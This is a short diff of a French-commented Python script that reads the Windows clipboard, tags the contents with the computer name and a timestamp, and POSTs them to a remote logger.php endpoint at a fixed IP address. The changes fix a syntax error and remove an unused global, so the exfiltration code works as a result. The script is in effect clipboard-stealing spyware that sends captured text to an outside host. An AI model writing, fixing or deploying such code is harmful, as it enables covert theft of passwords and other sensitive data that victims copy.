@@ -11,7 +11,6 @@ def get_clip():
     date = time.strftime("%Y%m%d_%H%M%S")
     pc_name = os.environ['COMPUTERNAME']
     clip_name = pc_name + "_" + date + '\n'
-    global data
     global donnees
     # Ouverture du Clipboard
     clip.OpenClipboard()
@@ -26,9 +25,8 @@ def send(f):
     # AVEC REQUESTS
     url = 'http://192.168.35.68:8080/logger.php?log='
     url_log = url + donnees
-    res = requests.post(url_log, data=donnees.decode()
+    res = requests.post(url_log, data=donnees.decode("utf-8"))
     print(res.text)
 
 
 send(get_clip())
-
